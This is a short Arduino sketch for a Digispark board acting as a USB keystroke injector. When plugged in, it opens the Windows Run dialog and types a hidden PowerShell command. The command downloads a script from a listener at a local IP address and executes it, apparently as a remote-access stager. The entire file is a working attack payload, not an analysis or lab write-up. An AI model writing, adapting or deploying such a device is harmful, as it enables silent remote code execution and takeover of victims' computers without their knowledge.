#include "DigiKeyboard.h"

#define WorkingPin 1  // Just as an LED indicator, as to when the work is finished

void setup() {
}

void loop() {
  digitalWrite(WorkingPin, HIGH);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("powershell.exe -nop -w hidden -c $t=new-object net.webclient;$t.proxy=[Net.WebRequest]::GetSystemWebProxy();$t.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $t.downloadstring('http://192.168.88.229:8080/d9mRz06cQdls');");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  digitalWrite(WorkingPin, LOW);
  for (;;) {
    /*Stops the digispark from running the scipt again*/
  }
}
